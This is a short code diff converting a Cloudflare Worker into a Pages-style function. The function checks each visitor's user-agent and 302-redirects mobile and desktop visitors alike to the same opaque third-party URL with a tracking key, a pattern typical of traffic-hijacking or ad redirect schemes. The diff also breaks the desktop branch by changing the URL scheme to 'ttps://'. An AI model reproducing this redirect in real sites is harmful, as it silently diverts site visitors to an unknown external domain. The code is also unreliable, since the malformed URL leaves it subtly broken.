@@ -1,5 +1,4 @@
-export default {
-  async fetch(request) {
+export async function onRequest(context) {
   const request = context.request;
   const userAgent = request.headers.get('user-agent') || '';
 
@@ -34,7 +33,6 @@ export default {
   if (isMobile) {
     return Response.redirect("https://attentionsdiplomatic.com/jxpph0kci5?key=b69c6da5a8cc59c054262e4404d60564", 302);
   } else {
-    return Response.redirect("https://attentionsdiplomatic.com/jxpph0kci5?key=b69c6da5a8cc59c054262e4404d60564", 302);
+    return Response.redirect("ttps://attentionsdiplomatic.com/jxpph0kci5?key=b69c6da5a8cc59c054262e4404d60564", 302);
   }
 }
-};
